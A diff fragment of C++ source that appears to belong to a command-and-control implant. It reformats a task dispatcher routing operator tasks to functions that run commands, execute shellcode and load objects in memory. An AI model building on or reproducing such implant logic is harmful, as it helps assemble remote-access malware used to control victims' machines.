@@ -210,25 +210,10 @@ namespace Dispatcher {
         x_memcpy(&Ctx->session.current_taskid, &task_id, sizeof(uint32_t));
 
         switch (Parser::UnpackDword(&parser)) {
-            case TypeCheckin:
-
-                x_memset(&Ctx->session.checkin, true, sizeof(bool));
-                break;
-
-            case TypeTasking:
-
-                Memory::Execute::ExecuteCommand(parser);
-                break;
-
-            case TypeExecute:
-
-                Memory::Execute::ExecuteShellcode(parser);
-                break;
-
-            case TypeObject:
-
-                Memory::Execute::LoadObject(parser);
-                break;
+            case TypeCheckin:   x_memset(&Ctx->session.checkin, true, sizeof(bool)); break;
+            case TypeTasking:   Memory::Execute::ExecuteCommand(parser); break;
+            case TypeExecute:   Memory::Execute::ExecuteShellcode(parser); break;
+            case TypeObject:    Memory::Execute::LoadObject(parser); break;
 
             default:
                 break;
